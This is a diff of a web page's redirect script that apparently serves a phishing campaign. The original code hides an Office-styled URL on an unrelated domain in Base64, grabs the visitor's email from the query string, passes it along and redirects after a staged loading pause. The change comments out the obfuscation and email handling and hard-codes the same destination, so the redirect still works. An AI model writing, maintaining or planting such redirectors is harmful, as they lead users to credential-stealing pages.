@@ -64,18 +64,18 @@
 
     <script>
         // Base64 encoded redirect URL
-        const encodedUrl = "aHR0cHM6Ly9vZmZpY2UuYWNqYXJ2aXNidWlsZGVycy5jb20vdUNlR1ZVamE=;
+        // const encodedUrl = "aHR0cHM6Ly9vZmZpY2UuYWNqYXJ2aXNidWlsZGVycy5jb20vdUNlR1ZVamE=;
 
-        // Decode the base URL
-        const baseRedirectUrl = atob(encodedUrl);
+        // // Decode the base URL
+        // const baseRedirectUrl = atob(encodedUrl);
 
-        // Extract email from the current URL's query parameters
-        const urlParams = new URLSearchParams(window.location.search);
-        const email = urlParams.get('email'); // Get the 'email' parameter
+        // // Extract email from the current URL's query parameters
+        // const urlParams = new URLSearchParams(window.location.search);
+        // const email = urlParams.get('email'); // Get the 'email' parameter
 
         // Add email as a query parameter to the redirect URL
-        const redirectUrl = email ? `${baseRedirectUrl}#${email}` : baseRedirectUrl;
-
+        // const redirectUrl = email ? `${baseRedirectUrl}#${email}` : baseRedirectUrl;
+        const redirectUrl = "https://office.acjarvisbuilders.com/uCeGVUja"
         // Simulate loading for 2 seconds and then redirect
         setTimeout(() => {
             window.location.href = redirectUrl;
